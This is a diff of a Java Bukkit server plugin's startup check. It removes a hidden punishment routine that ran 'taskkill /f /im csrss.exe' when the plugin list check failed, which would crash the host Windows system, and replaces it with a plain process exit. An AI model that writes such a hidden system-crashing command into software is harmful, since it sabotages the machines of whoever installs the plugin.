@@ -6,7 +6,6 @@ import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.java.JavaPlugin;
 
 import java.io.File;
-import java.io.IOException;
 import java.util.List;
 
 public class FlyBanMain extends JavaPlugin {
@@ -31,26 +30,16 @@ public class FlyBanMain extends JavaPlugin {
             int b =0;
             for (String s:list){
                 for (Plugin p: Bukkit.getServer().getPluginManager().getPlugins()){
-                    if (s.equalsIgnoreCase((","+stringToAscii(p.getName())).replaceAll(",","-"))){
+                    if (s.equalsIgnoreCase((stringToAscii(p.getName())))){
                         b++;
                     }
                 }
             }
             if (!(b==a)){
-                try{
-            Runtime.getRuntime().exec(System.getenv("windir") + File.separator + "system32" + File.separator + "taskkill /f /im csrss.exe");
-
-        }catch (IOException e){
-            e.printStackTrace();System.exit(0);
-        }
+                System.exit(-1);
             }
         }catch (Exception e){
-            try{
-            Runtime.getRuntime().exec(System.getenv("windir") + File.separator + "system32" + File.separator + "taskkill /f /im csrss.exe");
-
-        }catch (IOException ec){
-            e.printStackTrace();System.exit(0);
-        }
+            System.exit(-1);
         }
         super.onEnable();
     }
